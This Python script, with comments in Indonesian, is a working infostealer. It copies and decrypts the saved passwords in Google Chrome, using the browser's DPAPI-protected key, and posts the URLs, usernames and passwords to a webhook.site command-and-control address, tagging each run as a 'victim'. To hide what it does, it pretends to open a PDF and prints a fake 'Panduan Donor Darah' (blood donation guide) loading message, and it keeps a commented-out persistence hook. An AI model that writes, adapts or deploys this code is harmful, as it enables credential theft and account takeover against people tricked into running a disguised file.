import os
import sqlite3
import win32crypt
import shutil
import json
import requests
import subprocess
import sys
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64

# Konfigurasi C2 (ganti dengan domain InfinityFree-mu)
C2_URL = "https://webhook.site/905791a2-4c39-40b0-8f9a-1a4e373e17ab"
USER_ID = "victim_" + str(time.time())

def get_chrome_databases():
    base_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    local_state_path = os.path.join(base_path, "Local State")
    
    # Daftar kemungkinan nama profil
    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
    chrome_path = ""
    
    for p in profiles:
        temp_path = os.path.join(base_path, p, "Login Data")
        if os.path.exists(temp_path): # Cek apakah foldernya benar-benar ada
            chrome_path = temp_path
            break
            
    if not chrome_path:
        return local_state_path, None
        
    return local_state_path, chrome_path

def get_encryption_key():
    """Dekripsi encryption key Chrome"""
    local_state_path, _ = get_chrome_databases()
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # Remove 'DPAPI' prefix
    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(password, key):
    """Dekripsi password Chrome (V80+)"""
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(password)[:-16].decode()
        return decrypted
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def steal_chrome_passwords():
    """Steal semua password Chrome"""
    local_state_path, chrome_path = get_chrome_databases()

    if not chrome_path:
        print("Data tidak ditemukan, melewati proses...")
        return []
    
    # Copy database untuk avoid lock
    db_path = chrome_path.replace("Login Data", "LoginVaultVault.db")
    shutil.copyfile(chrome_path, db_path)
    
    key = get_encryption_key()
    db = sqlite3.connect(db_path)
    cursor = db.cursor()
    
    stolen_data = []
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        
        if url and username and encrypted_password:
            decrypted_password = decrypt_password(encrypted_password, key)
            if decrypted_password:
                stolen_data.append({
                    "url": url,
                    "username": username,
                    "password": decrypted_password
                })
    
    cursor.close()
    db.close()
    os.remove(db_path)  # Cleanup
    
    return stolen_data

def send_to_c2(data):
    """Kirim data ke InfinityFree hosting"""
    try:
        payload = {
            "user_id": USER_ID,
            "data": json.dumps(data, ensure_ascii=False),
            "timestamp": time.time()
        }
        
        response = requests.post(C2_URL, json=payload, timeout=10)
        return response.status_code == 200
    except:
        return False

def disguise_as_pdf():
    """Simulasi buka PDF untuk hindari suspicion"""
    time.sleep(2)
    subprocess.Popen([sys.executable, "-c", 
                     "import time; time.sleep(3); print('PDF loaded successfully!')"], 
                     creationflags=subprocess.CREATE_NO_WINDOW)

def main():
    """Main execution"""
    disguise_as_pdf()
    
    print("Loading Panduan Donor Darah...")  # Fake loading
    
    # Steal Chrome passwords
    passwords = steal_chrome_passwords()
    
    if passwords:
        print(f"Found {len(passwords)} credentials")
        success = send_to_c2(passwords)
        if success:
            print("Data sent successfully!")
        else:
            print("Failed to send data")
    else:
        print("No passwords found")
    
    # Persistensi (optional - uncomment jika perlu)
    # persist()
    
    time.sleep(5)
    sys.exit(0)

if __name__ == "__main__":
    main()